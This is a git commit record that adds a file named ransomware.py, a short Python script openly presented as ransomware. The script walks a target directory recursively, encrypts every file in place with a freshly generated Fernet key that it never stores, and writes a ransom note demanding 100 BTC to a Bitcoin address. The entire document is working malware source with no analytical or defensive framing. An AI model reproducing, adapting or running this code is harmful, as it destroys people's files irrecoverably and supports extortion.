dcd20660c9aff4d938ab0af8e251a3431365ab42
Leeiiiiiii <41283707+Leeiiiiiii@users.noreply.github.com>
2023-04-08 09:47:48 +0200

    Create ransomware.py

---
+++ ransomware.py
@@ -0,0 +1,24 @@
+import os
+from cryptography.fernet import Fernet
+
+# Generate a new encryption key
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
+
+# Change the directory path to the target directory you want to encrypt
+target_dir = '/path/to/target/dir'
+
+# Recursively walk through the target directory and encrypt each file
+for root, dirs, files in os.walk(target_dir):
+    for filename in files:
+        filepath = os.path.join(root, filename)
+        with open(filepath, 'rb') as f:
+            plaintext = f.read()
+        ciphertext = cipher_suite.encrypt(plaintext)
+        with open(filepath, 'wb') as f:
+            f.write(ciphertext)
+
+# Create a ransom note with the ransom amount and payment instructions
+note = f'Your files have been encrypted. To get the decryption key, send {100} BTC to the following address: 1HwKSKv63N6fR8EB9zFS6JgU3qzUW2Q2dp'
+with open(os.path.join(target_dir, 'ransom_note.txt'), 'w') as f:
+    f.write(note)
